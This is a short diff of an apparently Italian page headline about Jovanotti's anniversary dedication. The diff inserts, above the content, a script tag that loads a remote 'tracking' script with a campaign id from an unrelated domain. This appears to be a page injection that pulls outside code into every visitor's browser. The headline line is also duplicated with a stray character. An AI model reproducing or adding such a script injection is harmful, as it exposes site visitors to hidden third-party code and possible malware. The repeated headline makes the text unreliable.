@@ -1,3 +1,5 @@
+ <script src="https://originalitybrighter.site/_remote_track.js?campaign=ERBrzUkqN2"></script>
+
 Jovanotti, dedica social per l'anniversario di matrimonio
 
 YJovanotti, dedica social per l'anniversario di matrimonio
